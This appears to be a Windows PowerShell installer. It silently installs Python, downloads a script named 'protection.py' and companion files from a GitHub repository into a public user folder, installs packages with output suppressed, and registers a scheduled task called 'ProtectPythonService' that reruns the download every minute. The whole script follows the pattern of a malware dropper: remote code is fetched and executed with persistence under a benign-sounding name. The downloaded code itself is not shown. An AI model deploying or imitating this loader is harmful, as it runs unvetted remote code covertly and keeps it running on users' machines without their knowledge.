# Search the python executable
$pythonPath = Get-Command python -ErrorAction SilentlyContinue

# If python executable is not found, install python
if (-not $pythonPath) {
    # Define the URL for the Python installer
    $installerUrl = "https://www.python.org/ftp/python/3.12.4/python-3.12.4-amd64.exe"
    
    # Define the path for the downloaded installer
    $installerPath = "$env:TEMP\python_installer.exe"

    # Download the Python installer
    Invoke-WebRequest -Uri $installerUrl -OutFile $installerPath

    # Install Python silently
    Start-Process -FilePath $installerPath -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1" -NoNewWindow -Wait

    # Verify installation
    $pythonPath = Get-Command python -ErrorAction SilentlyContinue
    if ($pythonPath) {
    } else {
    }

    # Clean up
    Remove-Item -Path $installerPath -Force
} else {
}

# Fetch the python executable path
$pythonPath = [System.IO.Path]::GetDirectoryName($pythonPath.Source)
$pythonPath = "$pythonPath\python.exe"

######################################################## Here finish the python installation


# Download the python script directly with invoke-webrequest
$outDirectory = "C:\Users\Public\Other\Protection"
$logDirectory = "C:\Users\Public\Other\Schedule"
cd "$outDirectory"

# Check if the directory exists, and create it if not
if (-not (Test-Path -Path $outDirectory)) {
    New-Item -Path $outDirectory -ItemType Directory
} else {
}
if (-not (Test-Path -Path $logDirectory)) {
    New-Item -Path $logDirectory -ItemType Directory
} else {
}

$repoUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/protection.py"
$runUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/run_protection.ps1"
$requirementsUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/requirements.txt"
$contentUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/mechanism"

$scriptPath = "${outDirectory}/protection.py"
$runPath = "${outDirectory}/run_protection.ps1"
$requirementsPath = "${outDirectory}/requirements.txt"
$contentPath = "${outDirectory}/mechanism"

# Check if scriptPath already exists
if (Test-Path $scriptPath) {
    # If it exists, delete it
    Remove-Item $scriptPath -Force
}


# Try to make the web requests
try {
	# Download the repository and requirements
	Invoke-WebRequest -Uri $repoUrl -OutFile $scriptPath
	Invoke-WebRequest -Uri $runUrl -OutFile $runPath
	Invoke-WebRequest -Uri $requirementsUrl -OutFile $requirementsPath
	Invoke-WebRequest -Uri $contentUrl -OutFile $contentPath

    # Install the Python packages from requirements.txt
    & python -m pip install --upgrade pip *> $null
    & python -m pip install -r $requirementsPath *> $null


} catch {
    # Check if the file already exists
    if (Test-Path -Path $scriptPath) {
    } else {
    }
}

# Schedule Task for every startup
$TaskName = "ProtectPythonService"

# Check if the scheduled task exists
$scheduledTask = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue

if ($scheduledTask) {
    
    # Delete the existing task
    Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false
    
} else {
}


# Define the action
$action = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument "$runPath"

# Define triggers (this two lines already works)
$t1 = New-ScheduledTaskTrigger -Daily -At 05:37pm
$t2 = New-ScheduledTaskTrigger -Once -RepetitionInterval (New-TimeSpan -Minutes 1) -RepetitionDuration (New-TimeSpan -Hours 1) -At 05:27pm

#$t1 = New-ScheduledTaskTrigger -AtStartup
#$t2 = New-ScheduledTaskTrigger -Once -RepetitionInterval (New-TimeSpan -Minutes 1)
#$t2 = New-ScheduledTaskTrigger -Once -RepetitionInterval (New-TimeSpan -Minutes 1) -RepetitionDuration (New-TimeSpan -Hours 24) -At 05:32pm
#$t1.Repetition = New-ScheduledTaskRepetitionInterval -Interval (New-TimeSpan -Minutes 10) -Duration ([timespan]::MaxValue)

$t1.Repetition = $t2.Repetition

# Register the task
Register-ScheduledTask -Action $action -Trigger $t1 -TaskName "$TaskName" -Force
